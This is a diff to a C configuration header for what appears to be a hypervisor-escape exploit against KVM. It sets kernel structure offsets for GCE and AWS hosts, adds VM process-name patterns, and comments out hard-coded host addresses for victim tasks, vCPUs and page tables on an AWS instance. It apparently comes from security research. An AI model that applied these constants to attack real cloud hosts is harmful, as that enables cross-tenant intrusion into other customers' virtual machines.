@@ -106,6 +106,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #if MACHINE == FATHER
 
 #define OWN_TASK_NAME		"qemu-system-x86"
+#define VM_COMM                 "qemu-system-x86"
 
 // struct kvm_apic_map {
 #define H_MAP_PHYS_MAP		0x218	// struct kvm_lapic *phys_map[max_apic_id+1]
@@ -180,6 +181,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #elif MACHINE == GCE
 
 #define OWN_TASK_NAME		"VCPU-0"
+#define VM_COMM                 "VCPU-"
 
 // struct kvm_apic_map {
 #define H_MAP_PHYS_MAP		0x218   // struct kvm_lapic *phys_map[max_apic_id+1]
@@ -241,18 +243,19 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define H_INFO_HPA		0x8	// hpa_t hpa;
 // };
 
-// struct kvm { // TODO: THESE ARE ONLY THE PUXS:~/GIT/LINUX OFFSETS!!!
+// struct kvm {
 #define H_KVM_VCPU_ARRAY	0x1128	// struct xarray vcpu_array
-#define H_KVM_VM_LIST		0x1178	// struct list_head vm_list
+#define H_KVM_VM_LIST		-1	// struct list_head vm_list -- doesnt seem to exist on gce
 // };
 
 // struct xarray {
-#define H_XARRAY_HEAD		0x8	// void __rcu *xa_head
+#define H_XARRAY_HEAD		0x0	// actually a direct pointer to the kvm_vcpu struct
 // };
 
 #elif MACHINE == AWS
 
 #define OWN_TASK_NAME		"dom:44959644165"
+#define VM_COMM                 "dom:"
 
 // struct kvm_apic_map {
 #define H_MAP_PHYS_MAP		0x218   // struct kvm_lapic *phys_map[max_apic_id+1]
@@ -315,7 +318,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 
 // struct kvm {
 #define H_KVM_VCPU_ARRAY	0x48	// struct xarray vcpu_array
-#define H_KVM_VM_LIST		-1	// struct list_head vm_list // TODO DOESNT EXIST!?!
+#define H_KVM_VM_LIST		-1	// struct list_head vm_list -- doesnt seem to exist on aws
 // };
 
 // struct xarray {
@@ -387,17 +390,17 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 // #define OWN_VCPU	0xffff93e461290000
 // #define OWN_TASK	0xffff93f671ad4ce0
 // #define HCR3		0xa1278000UL
-// #define OWN_KVM	0xffffab3801795000
+// #define OWN_KVM	        0xffffab3801795000
 // --------[ rain-vm-aws-c5-extra ]----------
-#define BASE		0x9e39e218UL
-#define HOST_DIRECT_MAP	0xffff9868c0000000
-#define OWN_VCPU	0xffff98695f2137c0
-#define OWN_TASK	0xffff98695f1eb2a0
-#define HCR3		0x9e154000UL
-#define VICTIM_TASK	0xffff987b61afb2a0
-#define VICTIM_VCPU	0xffff98695f2137c0 // 0xffff98695f20b7c0 // 0xffff98695f1f0000
-#define EPTP		0x9f333000UL // 0x9f35f000UL
-#define GCR3		0xa3668e000UL // ?
+// #define BASE		0x9e39e218UL
+// #define HOST_DIRECT_MAP	0xffff9868c0000000
+// #define OWN_VCPU	0xffff98695f2137c0
+// #define OWN_TASK	0xffff98695f1eb2a0
+// #define HCR3		0x9e154000UL
+// #define VICTIM_TASK	0xffff987b61afb2a0
+// #define VICTIM_VCPU	0xffff98695f2137c0 // 0xffff98695f20b7c0 // 0xffff98695f1f0000
+// #define EPTP		0x9f333000UL // 0x9f35f000UL
+// #define GCR3		0xa3668e000UL // ?
 // #define VICTIM_VCPU	0x
 // // --------[ rain-vm-aws-c5-extra-old ]----------
 // #define BASE		0x9b223218UL
